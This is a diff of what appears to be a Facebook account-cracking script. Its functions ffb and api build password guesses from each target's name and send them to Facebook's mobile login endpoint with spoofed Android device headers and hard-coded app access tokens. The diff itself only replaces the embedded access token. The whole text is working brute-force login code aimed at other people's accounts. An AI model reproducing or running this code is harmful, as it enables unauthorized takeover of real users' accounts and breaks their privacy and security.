@@ -326,7 +326,7 @@ def ffb(ids,names,passlist):
                         ln = fn
                 for pw in passlist:
                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        accessToken = '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'
                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                         fbbv = str(random.randint(111111111,999999999))
                         android_version = device['android_version']
@@ -353,14 +353,14 @@ def ffb(ids,names,passlist):
                         device_id = str(uuid.uuid4())
                         secure = str(uuid.uuid4())
                         family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        accessToken = '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'
                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
                         sim_serials = f'["{xd}"]'
                         li = ['28','29','210']
                         li2 = random.choice(li)
                         j1 = ''.join(random.choice(digits) for _ in range(2))
                         jazoest = li2+j1
-                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
+                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                         headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-USMII"}
                         url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
@@ -405,7 +405,7 @@ def api(ids,names,passlist):
                         ln = fn
                 for pw in passlist:
                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        accessToken = '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'
                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                         fbbv = str(random.randint(111111111,999999999))
                         android_version = device['android_version']
@@ -438,7 +438,7 @@ def api(ids,names,passlist):
                         device_id = str(uuid.uuid4())
                         secure = str(uuid.uuid4())
                         family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        accessToken = '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'
                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
                         sm=['GT-', 'SM-']
                         sim_serials = f'["{xd}"]'
@@ -457,7 +457,7 @@ def api(ids,names,passlist):
 "source": "device_based_login",
 "email": ids,
 "password": pas,
-"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+"access_token": "438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28",
 "generate_session_cookies": "1",
 "meta_inf_fbmeta": "",
 "advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
